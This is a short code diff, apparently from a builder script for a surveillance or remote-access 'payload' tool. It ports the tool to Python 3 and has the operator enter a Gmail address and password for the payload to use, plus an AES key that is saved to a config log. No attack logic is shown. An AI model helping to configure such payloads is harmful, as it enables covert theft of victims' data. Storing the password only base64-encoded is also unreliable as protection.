@@ -93,7 +93,7 @@ def create_new_config():
             GMAIL_USER = input('\nEnter a valid gmail address you want the payload to use: ').lower()
             if '@gmail.com' in GMAIL_USER:
                 break
-        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)))
+        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)).encode()).decode()
     else:
         GMAIL_USER = "None"
         GMAIL_PWD = ""
@@ -137,10 +137,10 @@ def get_conf_dir():
     conf_dir = os.path.join(payloads_path,'config{}'.format(i))
     os.makedirs(conf_dir)
 
-    with open(st_config,'rb') as sc:
+    with open(st_config,'r') as sc:
         content=sc.read()
-        content += "AES Encryption Key: {}".format(aes_encoded)
-        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'wb') as pc:
+        content += "\nAES Encryption Key: {}".format(aes_encoded)
+        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'w') as pc:
             pc.write(content)
 
     return conf_dir
